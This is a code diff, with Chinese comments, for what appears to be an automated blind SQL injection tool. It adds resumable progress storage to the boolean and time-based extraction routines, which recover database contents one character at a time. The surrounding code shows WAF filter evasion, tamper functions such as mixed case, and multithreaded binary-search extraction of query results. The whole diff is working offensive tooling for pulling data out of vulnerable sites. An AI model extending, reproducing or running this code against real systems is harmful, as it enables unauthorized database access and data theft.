@@ -12,6 +12,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from .builder import PayloadBuilder
 from .dbms import get_dialect
+from .progress import ProgressStore
 from ..tampers import mixed_case
 from .models import InjectionPoint, ResponseInfo, WafReport, similarity
 from .session import HttpSession
@@ -34,6 +35,7 @@ class BaseOracle:
         self.waf = waf
         self.requests = 0
         self.last_payload = ""                # 最近发送的完整 payload（复盘用）
+        self.progress = ProgressStore.for_spec(session.spec)   # 断点续跑（--fresh 关闭）
         self.dialect = get_dialect("mysql")   # 由 make_oracle 按 fp.dbms 覆盖
 
     def scalar(self, expr: str) -> str:
@@ -392,12 +394,25 @@ class BoolOracle(BaseOracle):
         result = [""] * length
         BLOCK = 16
         blocks = [(i + 1, min(i + BLOCK, length)) for i in range(0, length, BLOCK)]
+        done_blocks = set()
+        if self.progress:
+            for (a, b) in blocks:
+                blk = self.progress.get(f"bool|{expr}|{a}")
+                if blk is not None and len(blk) == b - a + 1:
+                    result[a - 1:b] = blk
+                    done_blocks.add((a, b))
+            if done_blocks:
+                self.s.log("INFO", f"[bool] 续跑：已恢复 {len(done_blocks)}/{len(blocks)} 块")
+        pending = [(a, b) for (a, b) in blocks if (a, b) not in done_blocks]
         with ThreadPoolExecutor(max_workers=self.workers) as ex:
             futs = {ex.submit(self._extract_block, expr, a, b): (a, b)
-                    for a, b in blocks}
+                    for a, b in pending}
             for f in as_completed(futs):
                 a, b = futs[f]
-                result[a - 1:b] = f.result()
+                blk = f.result()
+                result[a - 1:b] = blk
+                if self.progress:
+                    self.progress.put(f"bool|{expr}|{a}", blk)
         return "".join(result)
 
     # ------------------------------------------------------------------ 存在性
@@ -597,10 +612,24 @@ class TimeOracle(BaseOracle):
         length = self._binsearch(
             lambda m: self._ge(f"length(({expr}))", f"{m}", f"{m - 1}"), 1, 512)
         self.s.log("INFO", f"[time] 长度={length}，游程+分块提取: {expr[:60]}")
-        out = []
-        prev = None
-        for p in range(1, length + 1):
+        store_key = f"time|{expr}"
+        saved = self.progress.get(store_key) if self.progress else None
+        out, prev, start_pos = [], None, 1
+        if saved and saved.get("length") == length:
+            chars = {int(k): v for k, v in saved.get("chars", {}).items()}
+            if chars:
+                mx = max(chars)
+                out = [chr(chars[i]) for i in range(1, mx + 1)]
+                start_pos = mx + 1
+                prev = out[-1] or None
+                self.s.log("INFO", f"[time] 续跑：已恢复 {mx}/{length} 字符")
+                if mx >= length:
+                    return "".join(out)
+        for p in range(start_pos, length + 1):
             if self.s.stopped:
+                if self.progress:
+                    self.progress.put(store_key, {"length": length, "chars": {
+                        str(i): ord(c) for i, c in enumerate(out, 1)}})
                 raise OracleError("用户中止")
             if prev:
                 eq = "=" if not self.waf.is_filtered("=") else " like "
@@ -608,6 +637,9 @@ class TimeOracle(BaseOracle):
                 b = self._substr_at(expr, p - 1)
                 if self.eval_bool(f"{self.code_expr(a)}{eq}{self.code_expr(b)}"):
                     out.append(prev)
+                    if self.progress:
+                        self.progress.put(store_key, {"length": length, "chars": {
+                            str(i): ord(c) for i, c in enumerate(out, 1)}})
                     continue
             code = self._binsearch(
                 lambda m: self._ge(self.code_expr(self._substr_at(expr, p)),
@@ -615,4 +647,7 @@ class TimeOracle(BaseOracle):
             ch = chr(code)
             out.append(ch)
             prev = ch or None
+            if self.progress:
+                self.progress.put(store_key, {"length": length, "chars": {
+                    str(i): ord(c) for i, c in enumerate(out, 1)}})
         return "".join(out)
